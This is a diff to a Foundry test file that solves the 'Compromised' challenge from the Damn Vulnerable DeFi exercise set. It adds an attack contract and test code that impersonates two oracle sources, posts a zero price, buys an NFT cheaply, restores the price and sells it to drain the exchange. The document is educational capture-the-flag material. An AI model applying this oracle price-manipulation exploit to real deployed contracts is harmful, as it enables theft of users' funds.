@@ -10,6 +10,30 @@ import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleIni
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract Attack is IERC721Receiver {
+    function buy(Exchange exchange) external payable returns (uint256 nftId) {
+        nftId = exchange.buyOne{value: msg.value}();
+    }
+
+    function sellAndRecover(Exchange exchange, DamnValuableNFT nft, address _recovery, uint256 nftId) external {
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+        payable(_recovery).transfer(999 ether);
+    }
+
+    // function
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -19,7 +43,6 @@ contract CompromisedChallenge is Test {
     uint256 constant INITIAL_NFT_PRICE = 999 ether;
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
-
 
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
@@ -75,7 +98,20 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        Attack att = new Attack();
+        vm.prank(sources[0]);
+        oracle.postPrice(symbols[0], 0);
+        vm.prank(sources[1]);
+        oracle.postPrice(symbols[0], 0);
+
+        uint256 nftId = att.buy{value: 1}(exchange);
+
+        vm.prank(sources[0]);
+        oracle.postPrice(symbols[0], 999 ether);
+        vm.prank(sources[1]);
+        oracle.postPrice(symbols[0], 999 ether);
+
+        att.sellAndRecover(exchange, nft, recovery, nftId);
     }
 
     /**
